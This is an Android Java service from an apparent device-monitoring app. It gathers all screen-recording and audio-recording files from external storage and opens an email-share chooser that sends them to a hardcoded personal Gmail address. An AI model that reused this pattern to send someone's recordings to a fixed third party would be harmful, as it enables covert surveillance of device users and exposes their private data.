package com.example.cube.monitor;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.util.ArrayList;

/**
 * Created by cube on 14/5/18.
 */

public class SendEmail extends Service{

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(getApplicationContext(), "Inside send email", Toast.LENGTH_SHORT).show();

        try {
            ArrayList<String> filePaths_List = new ArrayList<>();
            String screen_recordings = Environment.getExternalStorageDirectory().toString()
                    + File.separatorChar  + "screen_record/";
            String voice_recordings = Environment.getExternalStorageDirectory().toString()
                    + File.separatorChar + "audio_record/";

            File screen_directory = new File(screen_recordings);
            File voice_directory = new File(voice_recordings);

            File[] screen_files = screen_directory.listFiles();
            File[] voice_files = voice_directory.listFiles();

            int max_length = Math.max(screen_files.length, voice_files.length);

            for (int i = 0; i < max_length ;i++) {
                String screen_file_name = "", voice_file_name = "",
                        screen_filePathWithExternalPath = "", voice_filePathWithExternalPath = "";
                if(i < screen_files.length) {
                    screen_file_name = screen_files[i].getName();
                    screen_filePathWithExternalPath = screen_recordings + screen_file_name ;
                    filePaths_List.add(screen_filePathWithExternalPath);

                }
                if(i < voice_files.length) {
                    voice_file_name = voice_files[i].getName();
                    voice_filePathWithExternalPath = voice_recordings + voice_file_name ;
                    filePaths_List.add(voice_filePathWithExternalPath);
                }
                Log.d("Files", "FileName:" + screen_filePathWithExternalPath + "   "+ voice_filePathWithExternalPath);
            }

            String [] filePaths = filePaths_List.toArray(new String[filePaths_List.size()]);
            //String filePaths[] = {externalStoragePathStr + "fadeintodarkness.mp3"};
            Intent emailIntent = new Intent(android.content.Intent.ACTION_SEND_MULTIPLE);
            emailIntent.setType("text/plain");
            emailIntent.putExtra(android.content.Intent.EXTRA_EMAIL, new String[]{"akarshan1996@gmail.com"});
            emailIntent.putExtra(android.content.Intent.EXTRA_SUBJECT, "Test Subject");
            emailIntent.putExtra(android.content.Intent.EXTRA_TEXT, "Here's your stuff");
            ArrayList<Uri> uris = new ArrayList<>();
            for (String file : filePaths) {
                File fileIn = new File(file);
                Uri u = Uri.fromFile(fileIn);
                uris.add(u);
            }
            Toast.makeText(getApplicationContext(), "Inside Email", Toast.LENGTH_SHORT).show();

            emailIntent.putParcelableArrayListExtra(Intent.EXTRA_STREAM, uris);
            startActivity(Intent.createChooser(emailIntent, "Send attachment with what app?"));

        }catch(Exception e){
            e.printStackTrace();
        }

        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}
